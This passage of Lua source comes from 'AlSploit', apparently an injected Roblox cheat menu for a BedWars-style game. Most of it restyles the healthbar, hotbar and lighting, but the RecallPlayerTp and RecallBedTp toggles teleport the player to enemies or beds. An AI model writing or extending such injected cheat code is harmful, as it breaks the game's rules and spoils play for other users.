	local HealthbarPath = LocalPlayer.PlayerGui:WaitForChild("hotbar"):WaitForChild("1"):WaitForChild("HotbarHealthbarContainer")

	OldHealthbarClone.Parent = ReplicatedStorageService

	local function SetHealthbarModifications()
		for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):FindFirstChild("HealthbarProgressWrapper"):GetDescendants() do		
			if v:IsA("Frame") then
				v.BackgroundColor3 = Color3.new(1, 1, 1)

				local UICorner = Instance.new("UICorner")

				UICorner.Parent = v
				UICorner.Name = "UICorner"

				UICorner.CornerRadius = UDim.new(0, (AlSploitSettings.CustomHealthbar.CornerRadius.Value / 5))

				local UIGradient = Instance.new("UIGradient")

				UIGradient.Parent = v
				UIGradient.Name = "UIGradient"

				UIGradient.Rotation = AlSploitSettings.CustomHealthbar.Rotation.Value

				local ColorSplit = string.split(AlSploitSettings.CustomHealthbar.Color1.Value, ",")

				local R = ColorSplit[1]
				local G = ColorSplit[2]
				local B = ColorSplit[3]

				local ColorSplit2 = string.split(AlSploitSettings.CustomHealthbar.Color2.Value, ",")

				local R2 = ColorSplit2[1]
				local G2 = ColorSplit2[2]
				local B2 = ColorSplit2[3]

				UIGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(R, G, B)), ColorSequenceKeypoint.new(1, Color3.new(R2, G2, B2))})
			end
		end

		local UICorner = Instance.new("UICorner")

		UICorner.Parent = HealthbarPath
		UICorner.Name = "UICorner"

		UICorner.CornerRadius = UDim.new(0, (AlSploitSettings.CustomHealthbar.CornerRadius.Value / 5))

		local UIStroke = Instance.new("UIStroke")

		UIStroke.Parent = HealthbarPath
		UIStroke.Name = "UIStroke"

		UIStroke.Thickness = 1.6

		local ColorSplit = string.split(AlSploitSettings.CustomHealthbar.UIStrokeColor.Value, ",")

		local R = ColorSplit[1]
		local G = ColorSplit[2]
		local B = ColorSplit[3]

		UIStroke.Color = Color3.new(R, G, B)
	end

	local CustomHealthbar = WorldTab:CreateToggle({
		Name = "CustomHealthbar",

		Function = function()
			if AlSploitSettings.CustomHealthbar.Value == true then
				SetHealthbarModifications()
			end

			if AlSploitSettings.CustomHealthbar.Value == false then
				local OldHealthbar = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):FindFirstChild("HealthbarProgressWrapper")

				local NewHealthbarClone = OldHealthbarClone:Clone()

				NewHealthbarClone.Parent = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer")

				if OldHealthbar.Parent:FindFirstChildWhichIsA("UIStroke") then
					OldHealthbar.Parent:FindFirstChildWhichIsA("UIStroke"):Destroy()
				end

				OldHealthbar:Destroy()
			end
		end,

		HoverText = "Gives You A Cool Custom Healthtbar 🐟"
	})

	CustomHealthbar:CreateSlider({
		Name = "UIStrokeThickness",

		Function = function()
			if AlSploitSettings.CustomHealthbar.Value == true then
				local UIStroke = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):FindFirstChildWhichIsA("UIStroke")

				if UIStroke then
					UIStroke.Thickness = AlSploitSettings.CustomHealthbar.UIStrokeThickness.Value
				end
			end
		end,

		DefaultValue = 1.6,
		MaximumValue = 5
	})

	CustomHealthbar:CreateColorSlider({
		Name = "UIStrokeColor",

		Function = function()
			if AlSploitSettings.CustomHealthbar.Value == true then
				local UIStroke = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):FindFirstChildWhichIsA("UIStroke")

				if UIStroke then
					local ColorSplit = string.split(AlSploitSettings.CustomHealthbar.UIStrokeColor.Value, ",")

					local R = ColorSplit[1]
					local G = ColorSplit[2]
					local B = ColorSplit[3]

					UIStroke.Color = Color3.new(R, G, B)
				end
			end
		end,

		DefaultValue = Color3.new(0.203922, 0, 0.92549)
	})

	CustomHealthbar:CreateSlider({
		Name = "CornerRadius",

		Function = function() 
			if AlSploitSettings.CustomHealthbar.Value == true then
				local UICorner = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):FindFirstChildWhichIsA("UICorner")

				if UICorner then
					UICorner.CornerRadius = UDim.new(0, (AlSploitSettings.CustomHealthbar.CornerRadius.Value / 5))
				end

				if AlSploitSettings.CustomHealthbar.Value == true then
					for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):GetDescendants() do
						if v:IsA("UICorner") then							
							v.CornerRadius = UDim.new(0, (AlSploitSettings.CustomHealthbar.CornerRadius.Value / 5))
						end	
					end
				end 
			end
		end,

		DefaultValue = 40,
		MaximumValue = 100
	})

	CustomHealthbar:CreateSlider({
		Name = "Rotation",

		Function = function() 
			if AlSploitSettings.CustomHealthbar.Value == true then
				for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):GetDescendants() do
					if v:IsA("UIGradient") then							
						v.Rotation = AlSploitSettings.CustomHealthbar.Rotation.Value
					end	
				end
			end
		end,

		DefaultValue = 0,
		MaximumValue = 360
	})

	CustomHealthbar:CreateColorSlider({
		Name = "Color1",

		Function = function()
			if AlSploitSettings.CustomHealthbar.Value == true then
				for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):GetDescendants() do	
					if v:IsA("UIGradient") then							
						local ColorSplit = string.split(AlSploitSettings.CustomHealthbar.Color1.Value, ",")

						local R = ColorSplit[1]
						local G = ColorSplit[2]
						local B = ColorSplit[3]

						local ColorSplit2 = string.split(AlSploitSettings.CustomHealthbar.Color2.Value, ",")

						local R2 = ColorSplit2[1]
						local G2 = ColorSplit2[2]
						local B2 = ColorSplit2[3]

						v.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(R, G, B)), ColorSequenceKeypoint.new(1, Color3.new(R2, G2, B2))})
					end	
				end
			end
		end,

		DefaultValue = Color3.new(0.321569, 0, 0.92549)
	})

	CustomHealthbar:CreateColorSlider({
		Name = "Color2",

		Function = function()
			if AlSploitSettings.CustomHealthbar.Value == true then
				for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):GetDescendants() do	
					if v:IsA("UIGradient") then							
						local ColorSplit = string.split(AlSploitSettings.CustomHealthbar.Color1.Value, ",")

						local R = ColorSplit[1]
						local G = ColorSplit[2]
						local B = ColorSplit[3]

						local ColorSplit2 = string.split(AlSploitSettings.CustomHealthbar.Color2.Value, ",")

						local R2 = ColorSplit2[1]
						local G2 = ColorSplit2[2]
						local B2 = ColorSplit2[3]

						v.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(R, G, B)), ColorSequenceKeypoint.new(1, Color3.new(R2, G2, B2))})
					end	
				end
			end
		end,

		DefaultValue = Color3.new(0, 0.0666667, 0.92549)
	})

	AlSploitConnections["CustomHealthbarConnection"] = LocalPlayer.CharacterAdded:Connect(function()
		if AlSploitSettings.CustomHealthbar.Value == true then
			task.wait(1)

			SetHealthbarModifications()
		end
	end)

	UnInjectEvent.Event:Connect(function()
		local OldHealthbar = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):FindFirstChild("HealthbarProgressWrapper")

		local NewHealthbarClone = OldHealthbarClone:Clone()

		NewHealthbarClone.Parent = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer")

		if OldHealthbar.Parent:FindFirstChildWhichIsA("UIStroke") then
			OldHealthbar.Parent:FindFirstChildWhichIsA("UIStroke"):Destroy()
		end

		OldHealthbar:Destroy()
	end)
end)

task.spawn(function()
	local RecallPlayerTp, Self

	RecallPlayerTp, Self = WorldTab:CreateToggle({
		Name = "RecallPlayerTp",

		Function = function()
			if AlSploitSettings.RecallPlayerTp.Value == true then
				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 and shared.AlSploitUnInjected == false then
					local ChildRemovedConnection
					local ChildAddedConnection

					local RecallTimeTaken = tick()
					local RecallTick = tick()

					local Registered = false

					Recall()

					task.spawn(function()
						ChildRemovedConnection = game.Workspace.ChildAdded:Connect(function(Child)
							if Child.Name == "Recall" and Child:IsA("BasePart") then
								RecallTick = tick()

								ChildRemovedConnection:Disconnect()

								ChildRemovedConnection = game.Workspace.ChildRemoved:Connect(function(Child2)
									if Child2 == Child then
										RecallTimeTaken = tick() - RecallTick
										Registered = true

										ChildRemovedConnection:Disconnect()
									end
								end)
							end
						end)

						task.wait(6.5)

						Registered = nil
					end)

					repeat task.wait() until Registered == true or Registered == nil

					if RecallTimeTaken >= 5.5 and Registered ~= nil then
						Registered = false

						local NearestPlayer, NearestPlayerDistance = FindNearestPlayer()

						if NearestPlayer and AlSploitSettings.RecallPlayerTp.Value == true then
							task.wait(0.1)

							TweenToNearestPlayer((NearestPlayerDistance / 56) / 23.33)
						end
					end		

					AlSploitSettings.RecallPlayerTp.Value = false	
					Self.TextColor3 = Color3.new(1, 1, 1)
				end
			end
		end,

		HoverText = "Lets You Teleport To Players With The Recall Function 🐉"
	})
end)

task.spawn(function()	
	local OldHotbarClone = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):Clone()

	OldHotbarClone.Parent = ReplicatedStorageService

	local function SetHotbarModifications()
		for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do	
			task.spawn(function()
				if v:IsA("ImageButton") then							
					v.BackgroundTransparency = (AlSploitSettings.CustomHotbar.BackgroundTransparency.Value / 100)
					v.BackgroundColor3 = Color3.new(1, 1, 1)
					v.BorderSizePixel = 0

					local UIGradient = Instance.new("UIGradient")

					UIGradient.Parent = v
					UIGradient.Name = "UIGradient"

					UIGradient.Rotation = AlSploitSettings.CustomHotbar.Rotation.Value

					local ColorSplit = string.split(AlSploitSettings.CustomHotbar.Color1.Value, ",")

					local R = ColorSplit[1]
					local G = ColorSplit[2]
					local B = ColorSplit[3]

					local ColorSplit2 = string.split(AlSploitSettings.CustomHotbar.Color2.Value, ",")

					local R2 = ColorSplit2[1]
					local G2 = ColorSplit2[2]
					local B2 = ColorSplit2[3]

					UIGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(R, G, B)), ColorSequenceKeypoint.new(1, Color3.new(R2, G2, B2))})

					local UICorner = Instance.new("UICorner")

					UICorner.Parent = v
					UICorner.Name = "UICorner"

					UICorner.CornerRadius = UDim.new(0, (AlSploitSettings.CustomHotbar.CornerRadius.Value / 5))

					local UIStroke = Instance.new("UIStroke")

					UIStroke.Parent = v
					UIStroke.Name = "UIStroke"

					UIStroke.Transparency = 0.7
					UIStroke.Thickness = AlSploitSettings.CustomHotbar.UIStrokeThickness.Value
					UIStroke.Color = Color3.new(((R + R2) / 2), ((G + G2) / 2), ((B + B2) / 2))
				end
			end)	

			task.spawn(function()
				if v:IsA("UIListLayout") then
					LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):FindFirstChild("ItemsHotbarListLayout").Padding = UDim.new(0, AlSploitSettings.CustomHotbar.Spacing.Value)
				end
			end)

			task.spawn(function()
				if v:IsA("TextLabel") then
					v.BackgroundTransparency = 1
					v.TextTransparency = (AlSploitSettings.CustomHotbar.TextTransparency.Value / 100)
					v.TextColor3 = Color3.new(1, 1, 1)	
					v.Position = v.Position + UDim2.new(0, 2, 0, 2)
					v.Font = Enum.Font.GothamBold
				end
			end)

			task.spawn(function()
				if v:IsA("ImageButton") then	
					AlSploitConnections["CustomHotbarConnection2"] = v.Changed:Connect(function()
						if AlSploitSettings.CustomHotbar.Value == true then
							v.BackgroundTransparency = (AlSploitSettings.CustomHotbar.BackgroundTransparency.Value / 100)
							v.BackgroundColor3 = Color3.new(1, 1, 1)
							v.BorderSizePixel = 0

							local UIGradient = Instance.new("UIGradient")

							UIGradient.Parent = v
							UIGradient.Name = "UIGradient"

							UIGradient.Rotation = AlSploitSettings.CustomHotbar.Rotation.Value

							local ColorSplit = string.split(AlSploitSettings.CustomHotbar.Color1.Value, ",")

							local R = ColorSplit[1]
							local G = ColorSplit[2]
							local B = ColorSplit[3]

							local ColorSplit2 = string.split(AlSploitSettings.CustomHotbar.Color2.Value, ",")

							local R2 = ColorSplit2[1]
							local G2 = ColorSplit2[2]
							local B2 = ColorSplit2[3]

							UIGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(R, G, B)), ColorSequenceKeypoint.new(1, Color3.new(R2, G2, B2))})

							local UICorner = Instance.new("UICorner")

							UICorner.Parent = v
							UICorner.Name = "UICorner"

							UICorner.CornerRadius = UDim.new(0, (AlSploitSettings.CustomHotbar.CornerRadius.Value / 5))
						end
					end)			
				end
			end)	
		end
	end

	local CustomHotbar = WorldTab:CreateToggle({
		Name = "CustomHotbar",

		Function = function()
			if AlSploitSettings.CustomHotbar.Value == true then
				SetHotbarModifications()	
			end

			if AlSploitSettings.CustomHotbar.Value == false then
				local OldHotbar = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar")

				local NewHotbarClone = OldHotbarClone:Clone()

				NewHotbarClone.Parent = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1")
				OldHotbar:Destroy()
			end
		end,

		HoverText = "Gives You A Cool Custom Hotbar 😱"
	})

	CustomHotbar:CreateSlider({
		Name = "BackgroundTransparency",

		Function = function()
			if AlSploitSettings.CustomHotbar.Value == true then
				for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do	
					if v:IsA("ImageButton") then							
						v.BackgroundTransparency = (AlSploitSettings.CustomHotbar.BackgroundTransparency.Value / 100)
					end
				end
			end
		end,

		DefaultValue = 10,
		MaximumValue = 100
	})

	CustomHotbar:CreateSlider({
		Name = "UIStrokeThickness",

		Function = function()
			if AlSploitSettings.CustomHotbar.Value == true then
				for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do	
					if v:IsA("UIStroke") then							
						v.Thickness = AlSploitSettings.CustomHotbar.UIStrokeThickness.Value
					end
				end
			end
		end,

		DefaultValue = 1.3,
		MaximumValue = 5
	})

	CustomHotbar:CreateSlider({
		Name = "TextTransparency",

		Function = function()
			if AlSploitSettings.CustomHotbar.Value == true then
				for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do	
					if v:IsA("TextLabel") then							
						v.TextTransparency = (AlSploitSettings.CustomHotbar.TextTransparency.Value / 100)
					end
				end
			end
		end,

		DefaultValue = 100,
		MaximumValue = 100
	})

	CustomHotbar:CreateSlider({
		Name = "CornerRadius",

		Function = function() 
			if AlSploitSettings.CustomHotbar.Value == true then
				for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do	
					if v:IsA("UICorner") then							
						v.CornerRadius = UDim.new(0, (AlSploitSettings.CustomHotbar.CornerRadius.Value / 5))
					end
				end
			end
		end,

		DefaultValue = 30,
		MaximumValue = 100
	})

	CustomHotbar:CreateSlider({
		Name = "Rotation",

		Function = function() 
			if AlSploitSettings.CustomHotbar.Value == true then
				for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do	
					if v:IsA("UIGradient") then							
						v.Rotation = AlSploitSettings.CustomHotbar.Rotation.Value
					end	
				end
			end
		end,

		DefaultValue = 45,
		MaximumValue = 360
	})

	CustomHotbar:CreateSlider({
		Name = "Spacing",

		Function = function() 
			if AlSploitSettings.CustomHotbar.Value == true then
				LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):FindFirstChild("ItemsHotbarListLayout").Padding = UDim.new(0, AlSploitSettings.CustomHotbar.Spacing.Value)
			end
		end,

		DefaultValue = 8,
		MaximumValue = 20
	})

	CustomHotbar:CreateColorSlider({
		Name = "Color1",

		Function = function()
			if AlSploitSettings.CustomHotbar.Value == true then
				for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do	
					if v:IsA("UIGradient") then							
						local ColorSplit = string.split(AlSploitSettings.CustomHotbar.Color1.Value, ",")

						local R = ColorSplit[1]
						local G = ColorSplit[2]
						local B = ColorSplit[3]

						local ColorSplit2 = string.split(AlSploitSettings.CustomHotbar.Color2.Value, ",")

						local R2 = ColorSplit2[1]
						local G2 = ColorSplit2[2]
						local B2 = ColorSplit2[3]

						v.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(R, G, B)), ColorSequenceKeypoint.new(1, Color3.new(R2, G2, B2))})
					end	

					if v:IsA("UIStroke") then
						local ColorSplit = string.split(AlSploitSettings.CustomHotbar.Color1.Value, ",")

						local R = ColorSplit[1]
						local G = ColorSplit[2]
						local B = ColorSplit[3]

						local ColorSplit2 = string.split(AlSploitSettings.CustomHotbar.Color2.Value, ",")

						local R2 = ColorSplit2[1]
						local G2 = ColorSplit2[2]
						local B2 = ColorSplit2[3]

						v.Color = Color3.new(((R + R2) / 2), ((G + G2) / 2), ((B + B2) / 2))
					end
				end
			end
		end,

		DefaultValue = Color3.new(0.25098, 0, 1)
	})

	CustomHotbar:CreateColorSlider({
		Name = "Color2",

		Function = function()
			if AlSploitSettings.CustomHotbar.Value == true then
				for i, v in next, LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do	
					if v:IsA("UIGradient") then							
						local ColorSplit = string.split(AlSploitSettings.CustomHotbar.Color1.Value, ",")

						local R = ColorSplit[1]
						local G = ColorSplit[2]
						local B = ColorSplit[3]

						local ColorSplit2 = string.split(AlSploitSettings.CustomHotbar.Color2.Value, ",")

						local R2 = ColorSplit2[1]
						local G2 = ColorSplit2[2]
						local B2 = ColorSplit2[3]

						v.Rotation = AlSploitSettings.CustomHotbar.Rotation.Value
						v.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(R, G, B)), ColorSequenceKeypoint.new(1, Color3.new(R2, G2, B2))})
					end	

					if v:IsA("UIStroke") then
						local ColorSplit = string.split(AlSploitSettings.CustomHotbar.Color1.Value, ",")

						local R = ColorSplit[1]
						local G = ColorSplit[2]
						local B = ColorSplit[3]

						local ColorSplit2 = string.split(AlSploitSettings.CustomHotbar.Color2.Value, ",")

						local R2 = ColorSplit2[1]
						local G2 = ColorSplit2[2]
						local B2 = ColorSplit2[3]

						v.Color = Color3.new(((R + R2) / 2), ((G + G2) / 2), ((B + B2) / 2))
					end
				end
			end
		end,

		DefaultValue = Color3.new(0.0705882, 0, 1)
	})

	AlSploitConnections["CustomHotbarConnection"] = LocalPlayer.CharacterAdded:Connect(function()
		if AlSploitSettings.CustomHotbar.Value == true then
			task.wait(1)

			SetHotbarModifications()
		end
	end)

	UnInjectEvent.Event:Connect(function()
		local OldHotbar = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1"):FindFirstChild("ItemsHotbar")

		local NewHotbarClone = OldHotbarClone:Clone()

		NewHotbarClone.Parent = LocalPlayer.PlayerGui:WaitForChild("hotbar"):FindFirstChild("1")
		OldHotbar:Destroy()
	end)
end)

task.spawn(function()
	local RecallBedTp, Self

	RecallBedTp, Self = WorldTab:CreateToggle({
		Name = "RecallBedTp",

		Function = function()
			if AlSploitSettings.RecallBedTp.Value == true then
				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 and shared.AlSploitUnInjected == false then
					local ChildRemovedConnection
					local ChildAddedConnection

					local RecallTimeTaken = tick()
					local RecallTick = tick()

					local Registered = false

					Recall()

					task.spawn(function()
						ChildRemovedConnection = game.Workspace.ChildAdded:Connect(function(Child)
							if Child.Name == "Recall" and Child:IsA("BasePart") then
								RecallTick = tick()

								ChildRemovedConnection:Disconnect()

								ChildRemovedConnection = game.Workspace.ChildRemoved:Connect(function(Child2)
									if Child2 == Child then
										RecallTimeTaken = tick() - RecallTick
										Registered = true

										ChildRemovedConnection:Disconnect()
									end
								end)
							end
						end)

						task.wait(6.5)

						Registered = nil
					end)

					repeat task.wait() until Registered == true or Registered == nil

					if RecallTimeTaken >= 5.5 and Registered ~= nil then
						Registered = false

						local NearestBed, NearestBedDistance = FindNearestBed(true)

						if not NearestBed then
							NearestBed, NearestBedDistance = FindNearestBed(false)
						end

						if NearestBed and AlSploitSettings.RecallBedTp.Value == true then
							task.wait(0.1)

							TweenToNearestBed((NearestBedDistance / 56) / 23.33)
						end
					end		

					AlSploitSettings.RecallBedTp.Value = false	
					Self.TextColor3 = Color3.new(1, 1, 1)
				end
			end
		end,

		HoverText = "Lets You Teleport To Beds With The Recall Function 🦕"
	})
end)

task.spawn(function()
	local ColorCorrectionEffect = Instance.new("ColorCorrectionEffect")

	ColorCorrectionEffect.Parent = LightingService
	ColorCorrectionEffect.Name = "ColorCorrectionEffect"

	ColorCorrectionEffect.Brightness = 0.1
	ColorCorrectionEffect.Saturation = 0.5
	ColorCorrectionEffect.Enabled = false

	local Atmosphere = WorldTab:CreateToggle({
		Name = "Atmosphere",

		Function = function()
			if AlSploitSettings.Atmosphere.Value == true then
				local ColorSplit = string.split(AlSploitSettings.Atmosphere.Color.Value, ",")

				local R = ColorSplit[1]
				local G = ColorSplit[2]
				local B = ColorSplit[3]

				ColorCorrectionEffect.TintColor= Color3.new(R, G, B)				
				ColorCorrectionEffect.Enabled = true
			end

			if AlSploitSettings.Atmosphere.Value == false then
				ColorCorrectionEffect.Enabled = false
			end
		end,

		HoverText = "Gives You A Cool Atmosphere 🌆"
	})

	Atmosphere:CreateColorSlider({
		Name = "Color",

		Function = function()
			local ColorSplit = string.split(AlSploitSettings.Atmosphere.Color.Value, ",")

			local R = ColorSplit[1]
			local G = ColorSplit[2]
			local B = ColorSplit[3]

			ColorCorrectionEffect.TintColor= Color3.new(R, G, B)
		end,

		DefaultValue = Color3.new(0, 0.133333, 1)
	})

	UnInjectEvent.Event:Connect(function()
		ColorCorrectionEffect:Destroy()
	end)
end)

task.spawn(function()	
	local TexturePack = WorldTab:CreateToggle({
		Name = "TexturePack",

		Function = function() end,

		HoverText = "Makes Your ViewModel Look Cool 😎"
	})

	TexturePack:CreateToggle({
		Name = "TexturePackForResources",

		Function = function() end,

		DefaultValue = true
	})

	TexturePack:CreateToggle({
		Name = "TexturePackForPickaxes",

		Function = function() end,

		DefaultValue = true
	})

	TexturePack:CreateToggle({
		Name = "TexturePackForScythes",

		Function = function() end,

		DefaultValue = true
	})

	TexturePack:CreateToggle({
		Name = "TexturePackForSwords",

		Function = function() end,

		DefaultValue = true
	})

	AlSploitConnections["TexturePackConnection"] = ViewModel.ChildAdded:Connect(function(Tool)
		if AlSploitSettings.TexturePack.Value == true and shared.AlSploitUnInjected == false and IsAlive(LocalPlayer) == true and Tool:IsA("Accessory") then
			local TexturePack = game:GetObjects("rbxassetid://14654171957")

			local Import = TexturePack[1]

			Import.Parent = ReplicatedStorageService

			local TexturePackTable = {
				{
					Name = "wood_sword",
					Offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
					Model = Import:WaitForChild("Wood_Sword"),
				},	

				{
					Name = "stone_sword",
					Offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
					Model = Import:WaitForChild("Stone_Sword"),
				},

				{
					Name = "iron_sword",
					Offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
					Model = Import:WaitForChild("Iron_Sword"),
				},

				{
					Name = "diamond_sword",
					Offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
					Model = Import:WaitForChild("Diamond_Sword"),
				},	

				{
					Name = "emerald_sword",
					Offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
					Model = Import:WaitForChild("Emerald_Sword"),
				},

				{
					Name = "rageblade",
					Offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
					Model = Import:WaitForChild("Rageblade"),
				},

				{
					Name = "wood_scythe",
					Offset = CFrame.Angles(math.rad(0),math.rad(89),math.rad(-90)),
					Model = Import:WaitForChild("Wood_Scythe"),
				},

				{
					Name = "stone_scythe",
					Offset = CFrame.Angles(math.rad(0),math.rad(89),math.rad(-90)),
					Model = Import:WaitForChild("Stone_Scythe"),
				},

				{
					Name = "iron_scythe",
					Offset = CFrame.Angles(math.rad(0),math.rad(89),math.rad(-90)),
					Model = Import:WaitForChild("Iron_Scythe"),
				},

				{
					Name = "diamond_scythe",
					Offset = CFrame.Angles(math.rad(0),math.rad(89),math.rad(-90)),
					Model = Import:WaitForChild("Diamond_Scythe"),
				},

				{
					Name = "wood_pickaxe",
					Offset = CFrame.Angles(math.rad(0), math.rad(-10), math.rad(-95)),
					Model = Import:WaitForChild("Wood_Pickaxe"),
				},	

				{
					Name = "stone_pickaxe",
					Offset = CFrame.Angles(math.rad(0), math.rad(-10), math.rad(-95)),
					Model = Import:WaitForChild("Stone_Pickaxe"),
				},	

				{
					Name = "iron_pickaxe",
					Offset = CFrame.Angles(math.rad(0), math.rad(-10), math.rad(-95)),
					Model = Import:WaitForChild("Iron_Pickaxe"),
				},	

				{
					Name = "diamond_pickaxe",
					Offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-95)),
					Model = Import:WaitForChild("Diamond_Pickaxe"),
				},

				{
					Name = "diamond",
					Offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
					Model = Import:WaitForChild("Diamond"),
				},

				{
					Name = "iron",
					Offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
					Model = Import:WaitForChild("Iron"),
				},

				{
					Name = "emerald",
					Offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
					Model = Import:WaitForChild("Emerald"),
				},
			}

			for i, v in next, TexturePackTable do	
				if v.Name == Tool.Name then		
					local Model2
					local Model

					local Tool2

					local function ActivateTexturePack()
						for i2, v2 in next, Tool:GetDescendants() do
							if v2:IsA("BasePart") or v2:IsA("MeshPart") or v2:IsA("UnionOperation") then				
								v2.Transparency = 1
							end			
						end		

						Model = v.Model:Clone()

						Model.Parent = Tool		
						Model.Name = v.Name

						Model.CFrame = ((Tool:WaitForChild("Handle").CFrame * v.Offset) * CFrame.Angles(math.rad(0), math.rad(-50), math.rad(0)))	

						local Weld = Instance.new("WeldConstraint")

						Weld.Parent = Model
						Weld.Name = "WeldConstraint"

						Weld.Part0 = Model
						Weld.Part1 = Tool:WaitForChild("Handle")			

						Tool2 = LocalPlayer.Character:WaitForChild(v.Name)			

						for i2, v2 in next, Tool2:GetDescendants() do
							if v2:IsA("BasePart") or v2:IsA("MeshPart") or v2:IsA("UnionOperation") then				
								v2.Transparency = 1				
							end	
						end		

						Model2 = v.Model:Clone()

						Model2.Parent = Tool2
						Model2.Name = v.Name

						Model2.Anchored = false
						Model2.CFrame = ((Tool2:WaitForChild("Handle").CFrame * v.Offset)) * CFrame.Angles(math.rad(0), math.rad(-50), math.rad(0))
					end

					if v.Name == "iron" and AlSploitSettings.TexturePack.TexturePackForResources.Value == true then
						ActivateTexturePack()

						Model2.CFrame = (Model2.CFrame * CFrame.new(0, -0.24, 0))
					end

					if v.Name == "diamond" and AlSploitSettings.TexturePack.TexturePackForResources.Value == true then
						ActivateTexturePack()

						Model2.CFrame = (Model2.CFrame * CFrame.new(0, 0.027, 0))
					end

					if v.Name == "emerald" and AlSploitSettings.TexturePack.TexturePackForResources.Value == true then
						ActivateTexturePack()

						Model2.CFrame = (Model2.CFrame * CFrame.new(0, 0.001, 0))
					end

					if v.Name:find("pickaxe") and AlSploitSettings.TexturePack.TexturePackForPickaxes.Value == true then
						ActivateTexturePack()

						Model2.CFrame = ((Model2.CFrame * CFrame.new(-0.2, 0, -2.4)) + Vector3.new(0, 0, 2.12))
					end

					if v.Name:find("scythe") and AlSploitSettings.TexturePack.TexturePackForScythes.Value == true then
						ActivateTexturePack()

						Model2.CFrame = (Model2.CFrame * CFrame.new(-1.15, 0.2, -2.1)) 

					end

					if v.Name == "rageblade" and AlSploitSettings.TexturePack.TexturePackForSwords.Value == true then
						ActivateTexturePack()

						Model2.CFrame = (Model2.CFrame * CFrame.new(0.7, 0, -1)) 
					end

					if v.Name:find("sword") and AlSploitSettings.TexturePack.TexturePackForSwords.Value == true then
						ActivateTexturePack()

						Model2.CFrame = ((Model2.CFrame * CFrame.new(0.6, 0, -1.1)) + Vector3.new(0, 0, 0.3))
					end

					local Weld2 = Instance.new("WeldConstraint")

					Weld2.Parent = Model
					Weld2.Name = "WeldConstraint"

					Weld2.Part0 = Model2
					Weld2.Part1 = Tool2:WaitForChild("Handle")
				end
			end
		end     
	end)
end)

task.spawn(function()
	local BlurEffect = Instance.new("BlurEffect")

	BlurEffect.Parent = LightingService
	BlurEffect.Name = "BlurEffect"

	BlurEffect.Enabled = true
	BlurEffect.Size = 0

	local MotionBlur = WorldTab:CreateToggle({
		Name = "MotionBlur",

		Function = function()
			repeat
				task.wait()

